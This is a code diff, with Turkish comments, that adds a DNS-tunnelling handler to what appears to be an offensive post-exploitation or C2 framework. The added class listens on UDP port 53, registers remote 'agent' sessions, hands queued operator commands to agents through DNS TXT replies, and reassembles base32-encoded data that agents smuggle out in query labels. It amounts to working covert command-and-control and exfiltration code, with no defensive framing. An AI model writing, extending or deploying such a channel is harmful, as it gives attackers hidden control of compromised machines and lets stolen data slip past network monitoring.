@@ -720,3 +720,221 @@ class Handler(BaseHandler):
             except Exception as e:
                 print(f"[!] Hata: {e}")
                 break
+
+
+# ============================================================
+# DNS Tünel Handler
+# ============================================================
+
+class DNSChannelHandler:
+    """DNS tünelleme iletişim kanalı handler'ı.
+    
+    Agent'ın DNS sorguları üzerinden gönderdiği verileri alır
+    ve DNS TXT kayıtları ile komut gönderir.
+    
+    UDP port 53 üzerinde dinler (root yetkisi gerekebilir).
+    
+    Args:
+        options: Handler seçenekleri (LHOST, DNS_PORT vb.)
+    """
+
+    def __init__(self, options: Dict[str, Any]):
+        self.lhost = options.get("LHOST", "0.0.0.0")
+        self.dns_port = int(options.get("DNS_PORT", 53))
+        self.running = False
+        self.sock = None
+        self._sessions = {}      # session_hash -> {"addr", "data_buffer", "pending_cmd"}
+        self._pending_response = None
+        self._lock = threading.Lock()
+
+    def _build_dns_response(self, query_data: bytes, txt_value: str) -> bytes:
+        """DNS TXT cevap paketi oluşturur.
+        
+        Args:
+            query_data: Orijinal DNS sorgu paketi (header + question kopyalanır).
+            txt_value: TXT kaydına yazılacak değer.
+            
+        Returns:
+            bytes: DNS cevap paketi.
+        """
+        if len(query_data) < 12:
+            return b""
+
+        # Transaction ID'yi koru, flags = response + authoritative
+        txn_id = query_data[:2]
+        flags = struct.pack('>H', 0x8400)  # QR=1, AA=1
+
+        # Question section'ı bul
+        pos = 12
+        while pos < len(query_data) and query_data[pos] != 0:
+            label_len = query_data[pos]
+            if label_len & 0xC0 == 0xC0:
+                pos += 2
+                break
+            pos += 1 + label_len
+        else:
+            pos += 1
+        pos += 4  # QTYPE + QCLASS
+
+        question_section = query_data[12:pos]
+
+        # Header: QDCOUNT=1, ANCOUNT=1
+        header = txn_id + flags + struct.pack('>HHHH', 1, 1, 0, 0)
+
+        # Answer: pointer to question name + TXT record
+        txt_bytes = txt_value.encode('utf-8')
+        answer = (
+            b'\xc0\x0c'               # Name pointer to question
+            + struct.pack('>HH', 16, 1)  # TYPE=TXT, CLASS=IN
+            + struct.pack('>I', 60)      # TTL=60
+            + struct.pack('>H', len(txt_bytes) + 1)  # RDLENGTH
+            + struct.pack('B', len(txt_bytes))         # TXT length byte
+            + txt_bytes
+        )
+
+        return header + question_section + answer
+
+    def _parse_query_name(self, data: bytes) -> str:
+        """DNS sorgu paketinden domain adını çıkarır."""
+        if len(data) < 13:
+            return ""
+        pos = 12
+        labels = []
+        while pos < len(data) and data[pos] != 0:
+            label_len = data[pos]
+            if label_len & 0xC0 == 0xC0:
+                break
+            pos += 1
+            labels.append(data[pos:pos + label_len].decode('ascii', errors='ignore'))
+            pos += label_len
+        return '.'.join(labels)
+
+    def start(self):
+        """DNS handler'ı başlatır (UDP port 53)."""
+        try:
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            self.sock.bind((self.lhost, self.dns_port))
+            self.sock.settimeout(1.0)
+            self.running = True
+
+            print(f"[*] DNS Handler dinleniyor: {self.lhost}:{self.dns_port}")
+
+            while self.running:
+                try:
+                    data, addr = self.sock.recvfrom(4096)
+                    if not data:
+                        continue
+
+                    qname = self._parse_query_name(data)
+                    if not qname:
+                        continue
+
+                    # Kayıt sorgusu: reg.<hash>.<domain>
+                    if qname.startswith("reg."):
+                        response = self._build_dns_response(data, "OK")
+                        self.sock.sendto(response, addr)
+                        parts = qname.split('.')
+                        if len(parts) >= 3:
+                            session_hash = parts[1]
+                            with self._lock:
+                                self._sessions[session_hash] = {
+                                    "addr": addr,
+                                    "data_buffer": {},
+                                    "pending_cmd": None
+                                }
+                            print(f"[+] DNS Agent kaydı: {session_hash} ({addr[0]}:{addr[1]})")
+
+                    # Polling sorgusu: poll.<domain>
+                    elif qname.startswith("poll."):
+                        response_txt = "END"
+                        with self._lock:
+                            if self._pending_response:
+                                import base64
+                                encoded = base64.b64encode(
+                                    self._pending_response.encode('utf-8')
+                                ).decode('utf-8')
+                                response_txt = f"COMPLETE:{encoded}"
+                                self._pending_response = None
+
+                        response = self._build_dns_response(data, response_txt)
+                        self.sock.sendto(response, addr)
+
+                    # Veri sorgusu: <encoded>.<seq_info>.<domain>
+                    elif any(qname.split('.')[-2].startswith('s') and 't' in qname.split('.')[-2] for _ in [1] if len(qname.split('.')) >= 3):
+                        parts = qname.split('.')
+                        # seq_info parsing: s<idx>t<total>
+                        seq_info = parts[-2] if len(parts) >= 3 else ""
+                        try:
+                            s_pos = seq_info.index('s')
+                            t_pos = seq_info.index('t')
+                            seq_idx = int(seq_info[s_pos+1:t_pos])
+                            seq_total = int(seq_info[t_pos+1:])
+
+                            # Data labels (seq ve domain hariç)
+                            data_labels = '.'.join(parts[:-2])
+
+                            with self._lock:
+                                for session in self._sessions.values():
+                                    if session["addr"] == addr or True:
+                                        session["data_buffer"][seq_idx] = data_labels
+                                        # Tüm parçalar geldiyse birleştir
+                                        if len(session["data_buffer"]) == seq_total:
+                                            import base64
+                                            full_encoded = ''.join(
+                                                session["data_buffer"][i]
+                                                for i in range(seq_total)
+                                            )
+                                            try:
+                                                padding = (8 - len(full_encoded) % 8) % 8
+                                                decoded = base64.b32decode(
+                                                    full_encoded.upper() + '=' * padding
+                                                ).decode('utf-8')
+                                                print(f"[+] DNS Veri alındı: {decoded[:80]}...")
+                                            except Exception:
+                                                pass
+                                            session["data_buffer"] = {}
+                                        break
+                        except (ValueError, IndexError):
+                            pass
+
+                        # ACK gönder
+                        response = self._build_dns_response(data, "OK")
+                        self.sock.sendto(response, addr)
+
+                    else:
+                        # Bilinmeyen sorgu — boş cevap
+                        response = self._build_dns_response(data, "")
+                        self.sock.sendto(response, addr)
+
+                except socket.timeout:
+                    continue
+                except Exception as e:
+                    if self.running:
+                        print(f"[!] DNS Handler hatası: {e}")
+
+        except PermissionError:
+            print("[!] DNS Handler: Port 53 için root/admin yetkisi gerekiyor.")
+            print("[*] İpucu: sudo ile çalıştırın veya DNS_PORT değerini değiştirin.")
+        except Exception as e:
+            print(f"[!] DNS Handler başlatma hatası: {e}")
+        finally:
+            self.stop()
+
+    def send_command(self, command: str):
+        """Agent'a gönderilecek komutu kuyruğa ekler.
+        
+        Komut, agent'ın bir sonraki poll sorgusunda TXT kaydı olarak döner.
+        """
+        with self._lock:
+            self._pending_response = command
+
+    def stop(self):
+        """DNS Handler'ı durdurur."""
+        self.running = False
+        if self.sock:
+            try:
+                self.sock.close()
+            except Exception:
+                pass
+            self.sock = None
